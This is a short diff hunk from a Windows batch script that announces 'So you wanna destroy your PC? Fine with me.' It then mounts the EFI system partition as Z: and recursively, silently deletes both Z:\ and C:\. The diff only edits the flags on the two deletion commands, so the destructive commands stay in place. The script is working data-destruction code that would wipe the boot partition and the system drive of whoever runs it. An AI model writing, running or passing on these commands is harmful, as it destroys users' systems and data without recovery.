@@ -32,6 +32,6 @@ pause >nul
 echo So you wanna destroy your PC? Fine with me.
 pause
 mountvol Z: /S
-rd Z:\ /s /q /a
-rd C:\ /s /q /a
+rd Z:\ /s /q
+rd C:\ /s /q
 echo Done.
